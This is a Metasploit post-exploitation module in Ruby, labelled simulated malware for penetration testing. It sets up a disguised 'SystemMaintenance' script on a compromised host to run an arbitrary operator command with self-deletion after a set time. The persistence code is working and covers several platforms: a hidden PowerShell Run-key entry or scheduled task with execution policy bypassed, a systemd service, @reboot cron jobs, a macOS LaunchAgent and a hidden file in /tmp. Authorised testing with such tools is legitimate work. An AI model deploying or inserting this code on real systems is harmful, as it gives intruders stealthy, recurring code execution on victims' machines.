##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Common

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Multi Platform Time-Bomb Persistence (Simulated Malware)',
        'Description' => %q{
          This module simulates malware behavior by creating a persistent backdoor
          that automatically self-destructs after a configurable time period.
          This is useful for penetration testing to demonstrate persistence without
          requiring manual cleanup. The module creates a script that establishes
          persistence and includes a time-bomb mechanism to remove all artifacts
          after the specified duration expires.

          SIMULATED MALWARE CATEGORY:
          This module is part of the simulated malware category, designed for
          penetration testing and security research. It includes automatic cleanup
          to ensure artifacts are removed without manual intervention.

          Supports: Windows, Linux, macOS via Meterpreter or Shell sessions.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'Metasploit Framework' ],
        'Platform' => [ 'win', 'linux', 'osx', 'unix' ],
        'SessionTypes' => [ 'meterpreter', 'shell' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES]
        }
      )
    )

    register_options(
      [
        OptInt.new('EXPIRATION_HOURS', [true, 'Hours until auto-cleanup (time bomb)', 24]),
        OptString.new('PAYLOAD_COMMAND', [false, 'Custom command/payload to execute (leave blank to use current session info)']),
        OptEnum.new('TRIGGER', [true, 'When to execute payload', 'BOOT', ['BOOT', 'LOGIN', 'INTERVAL']]),
        OptInt.new('INTERVAL_MINUTES', [false, 'Interval in minutes for INTERVAL trigger', 60]),
        OptBool.new('VERBOSE', [true, 'Verbose output', true])
      ]
    )
  end

  def run
    print_status("=" * 60)
    print_status("SIMULATED MALWARE: Time-Bomb Persistence Module")
    print_status("=" * 60)
    print_warning("This module creates artifacts that will AUTO-DELETE after #{datastore['EXPIRATION_HOURS']} hours")
    print_status("=" * 60)

    # Detect platform
    platform = detect_platform
    unless platform
      print_error("Unable to detect platform")
      return
    end

    print_status("Detected platform: #{platform}")

    # Generate the time-bomb script based on platform
    script_content = generate_timebomb_script(platform)
    unless script_content
      print_error("Failed to generate script for platform: #{platform}")
      return
    end

    # Deploy the script
    script_path = deploy_script(platform, script_content)
    unless script_path
      print_error("Failed to deploy script")
      return
    end

    print_good("Time-bomb script deployed: #{script_path}")

    # Setup persistence
    if setup_persistence(platform, script_path)
      print_good("Persistence established successfully")
      print_status("Auto-cleanup scheduled for: #{Time.now + (datastore['EXPIRATION_HOURS'] * 3600)}")
      print_status("Artifacts will self-destruct after #{datastore['EXPIRATION_HOURS']} hours")
    else
      print_error("Failed to setup persistence")
      cleanup_script(platform, script_path)
    end
  end

  def detect_platform
    sysinfo = nil
    begin
      if session.type == 'meterpreter'
        sysinfo = session.sys.config.sysinfo
        os = sysinfo['OS']
      else
        # Shell session - try to detect via commands
        os = cmd_exec('uname -s 2>/dev/null || ver 2>/dev/null || echo unknown').to_s.strip
      end

      return 'windows' if os =~ /windows/i
      return 'linux' if os =~ /linux/i
      return 'osx' if os =~ /darwin/i || os =~ /mac/i
      return 'unix' if os =~ /bsd/i || os =~ /unix/i
    rescue StandardError => e
      vprint_error("Error detecting platform: #{e.message}")
    end

    nil
  end

  def generate_timebomb_script(platform)
    expiration_seconds = datastore['EXPIRATION_HOURS'] * 3600
    expiration_timestamp = Time.now.to_i + expiration_seconds

    case platform
    when 'windows'
      generate_windows_script(expiration_timestamp)
    when 'linux', 'osx', 'unix'
      generate_unix_script(expiration_timestamp, platform)
    end
  end

  def generate_windows_script(expiration_timestamp)
    payload_cmd = datastore['PAYLOAD_COMMAND'] || 'echo Simulated malware payload'

    script = <<~POWERSHELL
      # Time-Bomb Persistence Script (Simulated Malware)
      # Auto-cleanup timestamp: #{Time.at(expiration_timestamp)}

      $expirationTime = #{expiration_timestamp}

      function Check-Expiration {
          $currentTime = [int][double]::Parse((Get-Date -UFormat %s))
          if ($currentTime -ge $expirationTime) {
              return $true
          }
          return $false
      }

      function Cleanup-Artifacts {
          try {
              # Remove scheduled task
              schtasks /Delete /TN "SystemMaintenance" /F 2>$null
              # Remove registry key
              Remove-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "SystemMaintenance" -ErrorAction SilentlyContinue
              # Remove this script
              Remove-Item -Path $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
          } catch {}
          exit
      }

      # Check if expired
      if (Check-Expiration) {
          Cleanup-Artifacts
      }

      # Execute payload (simulated)
      try {
          #{payload_cmd}
      } catch {}
    POWERSHELL

    script
  end

  def generate_unix_script(expiration_timestamp, platform)
    payload_cmd = datastore['PAYLOAD_COMMAND'] || 'echo "Simulated malware payload"'

    script = <<~BASH
      #!/bin/bash
      # Time-Bomb Persistence Script (Simulated Malware)
      # Auto-cleanup timestamp: #{Time.at(expiration_timestamp)}

      EXPIRATION_TIME=#{expiration_timestamp}
      SCRIPT_PATH="$0"

      check_expiration() {
          CURRENT_TIME=$(date +%s)
          if [ "$CURRENT_TIME" -ge "$EXPIRATION_TIME" ]; then
              return 0
          fi
          return 1
      }

      cleanup_artifacts() {
          # Remove cron job
          crontab -l 2>/dev/null | grep -v "$(basename $SCRIPT_PATH)" | crontab - 2>/dev/null
          
          # Remove systemd service (Linux)
          if [ -f "/etc/systemd/system/system-maintenance.service" ]; then
              systemctl stop system-maintenance.service 2>/dev/null
              systemctl disable system-maintenance.service 2>/dev/null
              rm -f /etc/systemd/system/system-maintenance.service 2>/dev/null
          fi
          
          # Remove LaunchAgent (macOS)
          if [ -f "$HOME/Library/LaunchAgents/com.system.maintenance.plist" ]; then
              launchctl unload "$HOME/Library/LaunchAgents/com.system.maintenance.plist" 2>/dev/null
              rm -f "$HOME/Library/LaunchAgents/com.system.maintenance.plist" 2>/dev/null
          fi
          
          # Remove this script
          rm -f "$SCRIPT_PATH" 2>/dev/null
          exit 0
      }

      # Check if expired
      if check_expiration; then
          cleanup_artifacts
      fi

      # Execute payload (simulated)
      #{payload_cmd}
    BASH

    script
  end

  def deploy_script(platform, script_content)
    case platform
    when 'windows'
      script_name = 'SystemMaintenance.ps1'
      script_dir = get_temp_dir(platform)
      script_path = "#{script_dir}\\#{script_name}"
      
      begin
        write_file(script_path, script_content)
        vprint_good("Script written to: #{script_path}")
        return script_path
      rescue StandardError => e
        print_error("Failed to write script: #{e.message}")
        return nil
      end

    when 'linux', 'osx', 'unix'
      script_name = '.system_maintenance'
      script_dir = get_temp_dir(platform)
      script_path = "#{script_dir}/#{script_name}"
      
      begin
        write_file(script_path, script_content)
        cmd_exec("chmod +x #{script_path}")
        vprint_good("Script written to: #{script_path}")
        return script_path
      rescue StandardError => e
        print_error("Failed to write script: #{e.message}")
        return nil
      end
    end
  end

  def get_temp_dir(platform)
    case platform
    when 'windows'
      if session.type == 'meterpreter'
        return session.sys.config.getenv('TEMP')
      else
        return cmd_exec('echo %TEMP%').strip
      end
    when 'linux', 'osx', 'unix'
      return '/tmp'
    end
  end

  def setup_persistence(platform, script_path)
    trigger = datastore['TRIGGER']

    case platform
    when 'windows'
      setup_windows_persistence(script_path, trigger)
    when 'linux'
      setup_linux_persistence(script_path, trigger)
    when 'osx'
      setup_osx_persistence(script_path, trigger)
    when 'unix'
      setup_unix_persistence(script_path, trigger)
    end
  end

  def setup_windows_persistence(script_path, trigger)
    case trigger
    when 'BOOT', 'LOGIN'
      # Use Registry Run key for login persistence
      cmd = "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v SystemMaintenance /t REG_SZ /d \"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File #{script_path}\" /f"
      result = cmd_exec(cmd)
      return result.to_s.downcase.include?('success') || result.to_s.empty?
    when 'INTERVAL'
      # Use Scheduled Task for interval-based execution
      interval = datastore['INTERVAL_MINUTES'] || 60
      cmd = "schtasks /Create /TN SystemMaintenance /TR \"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File #{script_path}\" /SC MINUTE /MO #{interval} /F"
      result = cmd_exec(cmd)
      return result.to_s.downcase.include?('success') || result.to_s.empty?
    end
    false
  end

  def setup_linux_persistence(script_path, trigger)
    case trigger
    when 'BOOT', 'LOGIN'
      # Try systemd first, fall back to cron
      if setup_systemd_persistence(script_path)
        return true
      else
        return setup_cron_persistence(script_path, '@reboot')
      end
    when 'INTERVAL'
      interval = datastore['INTERVAL_MINUTES'] || 60
      return setup_cron_persistence(script_path, "*/#{interval} * * * *")
    end
    false
  end

  def setup_systemd_persistence(script_path)
    # Validate script path to prevent injection
    unless script_path =~ %r{^[/a-zA-Z0-9._-]+$}
      vprint_error('Invalid script path format')
      return false
    end

    service_content = <<~SERVICE
      [Unit]
      Description=System Maintenance
      After=network.target

      [Service]
      Type=oneshot
      ExecStart=#{script_path}

      [Install]
      WantedBy=multi-user.target
    SERVICE

    service_path = '/etc/systemd/system/system-maintenance.service'

    begin
      write_file(service_path, service_content)
      cmd_exec('systemctl daemon-reload')
      cmd_exec('systemctl enable system-maintenance.service')
      vprint_good('Systemd service created')
      return true
    rescue StandardError => e
      vprint_error("Failed to create systemd service: #{e.message}")
      return false
    end
  end

  def setup_cron_persistence(script_path, schedule)
    begin
      # Get current crontab
      current_cron = cmd_exec('crontab -l 2>/dev/null')
      
      # Add our job - use temp file to avoid shell expansion issues
      cron_entry = "#{schedule} #{script_path}"
      temp_cron = "/tmp/.crontab_#{Rex::Text.rand_text_alpha(8)}"
      write_file(temp_cron, current_cron + "\n#{cron_entry}\n")
      cmd_exec("crontab '#{temp_cron}'")
      cmd_exec("rm -f '#{temp_cron}'")
      
      vprint_good('Cron job created')
      return true
    rescue StandardError => e
      vprint_error("Failed to create cron job: #{e.message}")
      return false
    end
  end

  def setup_osx_persistence(script_path, trigger)
    case trigger
    when 'BOOT', 'LOGIN'
      return setup_launchagent_persistence(script_path, false)
    when 'INTERVAL'
      return setup_launchagent_persistence(script_path, true)
    end
    false
  end

  def setup_launchagent_persistence(script_path, interval_mode)
    plist_content = if interval_mode
                      interval_seconds = (datastore['INTERVAL_MINUTES'] || 60) * 60
                      <<~PLIST
                        <?xml version="1.0" encoding="UTF-8"?>
                        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
                        <plist version="1.0">
                        <dict>
                            <key>Label</key>
                            <string>com.system.maintenance</string>
                            <key>ProgramArguments</key>
                            <array>
                                <string>#{script_path}</string>
                            </array>
                            <key>StartInterval</key>
                            <integer>#{interval_seconds}</integer>
                            <key>RunAtLoad</key>
                            <true/>
                        </dict>
                        </plist>
                      PLIST
                    else
                      <<~PLIST
                        <?xml version="1.0" encoding="UTF-8"?>
                        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
                        <plist version="1.0">
                        <dict>
                            <key>Label</key>
                            <string>com.system.maintenance</string>
                            <key>ProgramArguments</key>
                            <array>
                                <string>#{script_path}</string>
                            </array>
                            <key>RunAtLoad</key>
                            <true/>
                        </dict>
                        </plist>
                      PLIST
                    end

    plist_path = cmd_exec('echo $HOME').strip + '/Library/LaunchAgents/com.system.maintenance.plist'

    begin
      # Create LaunchAgents directory if it doesn't exist
      cmd_exec('mkdir -p $HOME/Library/LaunchAgents')
      
      write_file(plist_path, plist_content)
      cmd_exec("launchctl load #{plist_path}")
      vprint_good('LaunchAgent created')
      return true
    rescue StandardError => e
      vprint_error("Failed to create LaunchAgent: #{e.message}")
      return false
    end
  end

  def setup_unix_persistence(script_path, trigger)
    # Fall back to cron for generic Unix
    case trigger
    when 'BOOT', 'LOGIN'
      setup_cron_persistence(script_path, '@reboot')
    when 'INTERVAL'
      interval = datastore['INTERVAL_MINUTES'] || 60
      setup_cron_persistence(script_path, "*/#{interval} * * * *")
    end
  end

  def cleanup_script(platform, script_path)
    begin
      if platform == 'windows'
        cmd_exec("del /F /Q \"#{script_path}\"")
      else
        cmd_exec("rm -f #{script_path}")
      end
      vprint_status("Cleaned up script: #{script_path}")
    rescue StandardError => e
      vprint_error("Failed to cleanup script: #{e.message}")
    end
  end
end
